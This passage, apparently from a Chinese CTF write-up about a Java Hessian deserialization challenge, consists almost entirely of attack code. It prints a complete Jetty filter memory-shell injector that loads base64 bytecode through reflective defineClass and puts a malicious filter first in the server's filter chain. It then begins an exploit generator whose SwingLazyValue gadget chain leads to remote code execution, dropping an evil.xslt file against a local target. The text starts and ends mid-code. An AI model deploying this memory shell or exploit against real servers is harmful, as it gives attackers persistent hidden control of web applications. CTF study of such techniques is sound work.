class="hljs-built_in">this</span>.isInjected(servletHandler)) &#123;  <br>                <span class="hljs-type">PrintStream</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> System.out;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filter is already injected&quot;</span>;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                Class&lt;?&gt; filterHolderClass = <span class="hljs-literal">null</span>;  <br>  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    filterHolderClass = context.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;org.eclipse.jetty.servlet.FilterHolder&quot;</span>);  <br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var7) &#123;  <br>                    filterHolderClass = context.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;org.mortbay.jetty.servlet.FilterHolder&quot;</span>);  <br>                &#125;  <br>  <br>                Constructor&lt;?&gt; constructor = filterHolderClass.getConstructor(Class.class);  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filterHolder</span> <span class="hljs-operator">=</span> constructor.newInstance(filter.getClass());  <br>                invokeMethod(filterHolder, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.getClassName()&#125;);  <br>                invokeMethod(servletHandler, <span class="hljs-string">&quot;addFilterWithMapping&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;filterHolderClass, String.class, Integer.TYPE&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;filterHolder, <span class="hljs-built_in">this</span>.getUrlPattern(), <span class="hljs-number">1</span>&#125;);  <br>                <span class="hljs-built_in">this</span>.moveFilterToFirst(servletHandler);  <br>                invokeMethod(servletHandler, <span class="hljs-string">&quot;invalidateChainsCache&quot;</span>);  <br>                <span class="hljs-type">PrintStream</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.out;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">var10001</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filter added successfully&quot;</span>;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">moveFilterToFirst</span><span class="hljs-params">(Object servletHandler)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">filterMaps</span> <span class="hljs-operator">=</span> getFieldValue(servletHandler, <span class="hljs-string">&quot;_filterMappings&quot;</span>);  <br>        ArrayList&lt;Object&gt; reorderedFilters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();  <br>        <span class="hljs-keyword">if</span> (filterMaps.getClass().isArray()) &#123;  <br>            <span class="hljs-type">int</span> <span class="hljs-variable">filterLength</span> <span class="hljs-operator">=</span> Array.getLength(filterMaps);  <br>  <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterLength; ++i) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> Array.get(filterMaps, i);  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> (String)getFieldValue(filter, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    reorderedFilters.add(<span class="hljs-number">0</span>, filter);  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    reorderedFilters.add(filter);  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterLength; ++i) &#123;  <br>                Array.set(filterMaps, i, reorderedFilters.get(i));  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">if</span> (!(filterMaps <span class="hljs-keyword">instanceof</span> ArrayList)) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;filterMaps must be either an array or an ArrayList&quot;</span>);  <br>            &#125;  <br>  <br>            ArrayList&lt;Object&gt; filterList = (ArrayList)filterMaps;  <br>            <span class="hljs-type">int</span> <span class="hljs-variable">filterLength</span> <span class="hljs-operator">=</span> filterList.size();  <br>  <br>            <span class="hljs-keyword">for</span>(Object filter : filterList) &#123;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> (String)getFieldValue(filter, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    reorderedFilters.add(<span class="hljs-number">0</span>, filter);  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    reorderedFilters.add(filter);  <br>                &#125;  <br>            &#125;  <br>  <br>            filterList.clear();  <br>            filterList.addAll(reorderedFilters);  <br>        &#125;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span> &#123;  <br>        List&lt;Object&gt; contexts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();  <br>        Thread[] threads = (Thread[])Thread.getAllStackTraces().keySet().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>[<span class="hljs-number">0</span>]);  <br>  <br>        <span class="hljs-keyword">for</span>(Thread thread : threads) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> invokeMethod(thread, <span class="hljs-string">&quot;getContextClassLoader&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (contextClassLoader.getClass().getName().contains(<span class="hljs-string">&quot;WebAppClassLoader&quot;</span>)) &#123;  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> getFieldValue(contextClassLoader, <span class="hljs-string">&quot;_context&quot;</span>);  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getFieldValue(context, <span class="hljs-string">&quot;_servletHandler&quot;</span>);  <br>                    contexts.add(getFieldValue(handler, <span class="hljs-string">&quot;_contextHandler&quot;</span>));  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">threadLocals</span> <span class="hljs-operator">=</span> getFieldValue(thread, <span class="hljs-string">&quot;threadLocals&quot;</span>);  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> getFieldValue(threadLocals, <span class="hljs-string">&quot;table&quot;</span>);  <br>  <br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; Array.getLength(table); ++i) &#123;  <br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> Array.get(table, i);  <br>                        <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">null</span>) &#123;  <br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">httpConnection</span> <span class="hljs-operator">=</span> getFieldValue(entry, <span class="hljs-string">&quot;value&quot;</span>);  <br>                            <span class="hljs-keyword">if</span> (httpConnection != <span class="hljs-literal">null</span> &amp;&amp; httpConnection.getClass().getName().contains(<span class="hljs-string">&quot;HttpConnection&quot;</span>)) &#123;  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">httpChannel</span> <span class="hljs-operator">=</span> invokeMethod(httpConnection, <span class="hljs-string">&quot;getHttpChannel&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> invokeMethod(httpChannel, <span class="hljs-string">&quot;getRequest&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> invokeMethod(request, <span class="hljs-string">&quot;getSession&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> invokeMethod(session, <span class="hljs-string">&quot;getServletContext&quot;</span>);  <br>                                contexts.add(getFieldValue(servletContext, <span class="hljs-string">&quot;this$0&quot;</span>));  <br>                            &#125;  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br>            &#125; <span class="hljs-keyword">catch</span> (Exception var17) &#123;  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> contexts;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getShell</span><span class="hljs-params">(Object context)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();  <br>        <span class="hljs-keyword">if</span> (classLoader == <span class="hljs-literal">null</span>) &#123;  <br>            classLoader = context.getClass().getClassLoader();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> classLoader.loadClass(<span class="hljs-built_in">this</span>.getClassName()).newInstance();  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;  <br>            <span class="hljs-type">byte</span>[] clazzByte = (decodeBase64(<span class="hljs-built_in">this</span>.getBase64String()));  <br>            <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, Integer.TYPE, Integer.TYPE);  <br>            defineClass.setAccessible(<span class="hljs-literal">true</span>);  <br>            Class&lt;?&gt; clazz = (Class)defineClass.invoke(classLoader, clazzByte, <span class="hljs-number">0</span>, clazzByte.length);  <br>            <span class="hljs-keyword">return</span> clazz.newInstance();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInjected</span><span class="hljs-params">(Object servletHandler)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">filterMappings</span> <span class="hljs-operator">=</span> getFieldValue(servletHandler, <span class="hljs-string">&quot;_filterMappings&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (filterMappings == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            Object[] filterMaps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>];  <br>            <span class="hljs-keyword">if</span> (filterMappings <span class="hljs-keyword">instanceof</span> List) &#123;  <br>                filterMaps = ((List)filterMappings).toArray();  <br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (filterMappings <span class="hljs-keyword">instanceof</span> Object[]) &#123;  <br>                filterMaps = (Object[]) filterMappings;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">for</span>(Object filterMap : filterMaps) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> getFieldValue(filterMap, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] decodeBase64(String base64Str) <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Class&lt;?&gt; decoderClass = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> decoderClass.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, base64Str);  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;  <br>            Class&lt;?&gt; decoderClass = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);  <br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[])decoderClass.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(decoderClass.newInstance(), base64Str);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] gzipDecompress(<span class="hljs-type">byte</span>[] compressedData) <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br>        <span class="hljs-type">GZIPInputStream</span> <span class="hljs-variable">gzipInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>  <br>        <span class="hljs-type">byte</span>[] var5;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            gzipInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GZIPInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(compressedData));  <br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];  <br>  <br>            <span class="hljs-type">int</span> n;  <br>            <span class="hljs-keyword">while</span>((n = gzipInputStream.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;  <br>                out.write(buffer, <span class="hljs-number">0</span>, n);  <br>            &#125;  <br>  <br>            var5 = out.toByteArray();  <br>        &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">if</span> (gzipInputStream != <span class="hljs-literal">null</span>) &#123;  <br>                gzipInputStream.close();  <br>            &#125;  <br>  <br>            out.close();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> var5;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  <br>        <span class="hljs-keyword">for</span>(Class&lt;?&gt; clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(name);  <br>                field.setAccessible(<span class="hljs-literal">true</span>);  <br>                <span class="hljs-keyword">return</span> field.get(obj);  <br>            &#125; <span class="hljs-keyword">finally</span> &#123;  <br>  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchFieldException</span>(name);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object targetObject, String methodName)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException &#123;  <br>        <span class="hljs-keyword">return</span> invokeMethod(targetObject, methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object obj, String methodName, Class&lt;?&gt;[] paramClazz, Object[] param)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Class&lt;?&gt; clazz = obj <span class="hljs-keyword">instanceof</span> Class ? (Class)obj : obj.getClass();  <br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>  <br>            <span class="hljs-keyword">while</span>(clazz != <span class="hljs-literal">null</span> &amp;&amp; method == <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    <span class="hljs-keyword">if</span> (paramClazz == <span class="hljs-literal">null</span>) &#123;  <br>                        method = clazz.getDeclaredMethod(methodName);  <br>                    &#125; <span class="hljs-keyword">else</span> &#123;  <br>                        method = clazz.getDeclaredMethod(methodName, paramClazz);  <br>                    &#125;  <br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var7) &#123;  <br>                    clazz = clazz.getSuperclass();  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">if</span> (method == <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Method not found: &quot;</span> + methodName);  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                method.setAccessible(<span class="hljs-literal">true</span>);  <br>                <span class="hljs-keyword">return</span> method.invoke(obj <span class="hljs-keyword">instanceof</span> Class ? <span class="hljs-literal">null</span> : obj, param);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;  <br>            <span class="hljs-keyword">throw</span> e;  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Error invoking method: &quot;</span> + methodName, e);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyFilterMemoryShell</span>();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>上面那个JettyFilter.class字节码由下面的payload一键得出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br>  <br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;  <br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;  <br>  <br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;  <br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;  <br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;  <br>  <br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;  <br>  <br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;  <br>  <br><span class="hljs-keyword">import</span> javax.swing.*;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLEncoder;  <br><span class="hljs-keyword">import</span> java.util.Base64;  <br><span class="hljs-keyword">import</span> java.util.TreeMap;  <br><span class="hljs-keyword">import</span> java.util.TreeSet;  <br><span class="hljs-keyword">import</span> java.lang.String;<br><br><br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * whatever equals * MultiUIDefaults toString * UIDefaults get * SwingLazyValue createValue * rce */</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">tmpPath</span> <span class="hljs-operator">=</span> isLinux ? <span class="hljs-string">&quot;/tmp/&quot;</span> : <span class="hljs-string">&quot;C:\\Windows\\Temp\\&quot;</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilPath</span> <span class="hljs-operator">=</span> tmpPath + <span class="hljs-string">&quot;evil.xslt&quot;</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\src\\main\\java\\exp\\eddiemurphy\\template.xslt&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\JettyFilterMemoryShell.class&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">filterClass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\JettyFilter.class&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">targetURL</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;http://127.0.0.1:8082&quot;</span>;<br>    <span class="hljs-keyword">static</span> Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-comment">// read memory shell bytes  </span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(evilClass);  <br>        <span class="hljs-type">byte</span>[] evilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(evilBytes);  <br>        fis.close();  <br>  <br>        fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filterClass);<br>        <span class="hljs-type">byte</span>[] filterClass = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(filterClass);  <br>        fis.close();  <br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(filterClass)));  <br>  <br>        <span class="hljs-comment">// write evil bytes to template  </span><br>        fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(template);  <br>        <span class="hljs-type">byte</span>[] templateBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(templateBytes);  <br>        fis.close();  <br>  <br>        <span class="hljs-comment">// base64 encoded classBytes to bypass 